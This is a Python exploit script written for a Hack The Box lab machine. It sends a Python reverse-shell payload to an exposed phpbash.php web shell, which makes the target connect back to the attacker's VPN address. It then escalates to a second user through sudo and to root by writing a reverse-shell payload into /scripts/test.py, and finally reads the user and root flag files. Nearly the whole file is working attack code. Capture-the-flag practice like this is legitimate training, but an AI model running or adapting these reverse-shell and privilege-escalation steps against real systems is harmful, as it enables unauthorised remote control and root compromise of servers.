from pwn import *
import netifaces as ni
import urllib3, sys,argparse, subprocess,pty, time
urllib3.disable_warnings()
warnings.filterwarnings("ignore", category=UserWarning, module="pwntools")

proxy = {
    "http": "http://127.0.0.1:8080",
    "https": "https://127.0.0.1:8080"
}

try:
    ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
except ValueError:
    print("[-] You are not connected to HTB VPN")
    sys.exit(-2)

def exploit(RHOST, user):
    session = requests.session()
    headers = {
        "Host": f"{RHOST}",
        "User-Agent": "Faking header",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Referer": f"http://{RHOST}/dev/phpbash.php",
        "Content-type": "application/x-www-form-urlencoded",
        "Content-Length": "252",
        "Origin": f"http://{RHOST}",
        "DNT": "1",
        "Connection": "close"
    }
    listener = listen(0)
    port = listener.lport
    data = {
    "cmd": f"""cd /var/www/html/dev; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""
    }
    log.progress("[+] Sending the payload to the target!, Allow few minutes to get the shell")
    try:    ## Using the try,except since this connection waits until it responds, if i set timeout its gives me the error so to overcome i have done try and except method
        site = session.post(f"http://{RHOST}/dev/phpbash.php", headers=headers, data=data, verify=False, timeout=2)
    except:
        pass
    shell = listener.wait_for_connection()
    log.info("Access pwned for the machine!")
    if user == 1:
        log.info("Getting the user www-data")
        shell.interactive()
    elif user == 2:
        log.info("Getting the user scriptmanager")
        shell.sendline("sudo -u scriptmanager /bin/bash".encode())
        shell.interactive()
    elif user == 3:
        log.info("Getting the user root")
        l = listen(0)
        p = l.lport
        shell.sendline("sudo -u scriptmanager /bin/bash".encode())
        payload = f'''echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' > /scripts/test.py'''
        shell.sendline(payload.encode())
        p = l.wait_for_connection()
        p.sendline("cd /home/arrexel && cat user.txt && pwd && id && hostname && ip addr".encode())
        # time.sleep(2)
        user_proof = p.recv(1024).decode()
        print("\n\t USER PROOF")
        print(user_proof)

        p.sendline("cd /root && cat root.txt && pwd && id && hostname && ip addr".encode())
        print("\n\t ROOT PROOF")
        root_proof = p.recv(1024).decode()
        print(root_proof)
        p.interactive()
    else:
        print("[-] The Entered option is incorrect")
        sys.exit(-2)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-rht', '--RHOST', required=True, help="Enter the target the IP Address")
    argv = parser.parse_args()
    RHOST = argv.RHOST
    RHOST = RHOST.strip()
    response = subprocess.Popen(["ping", "-c", "3", RHOST], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = response.communicate()
    if "icmp_seq=" in output.decode():
        print("[+] The machine is up and running")
    else:
        print("[-] The machine is down or not started")
        sys.exit(-2)
    print('''
    1. www-data
    2. Scriptmanager
    3. Root
    ''')
    user = input("[+] Enter the user you want to pwn : ")
    user = int(user)
    exploit(RHOST, user)
    
if __name__ == "__main__":
    main()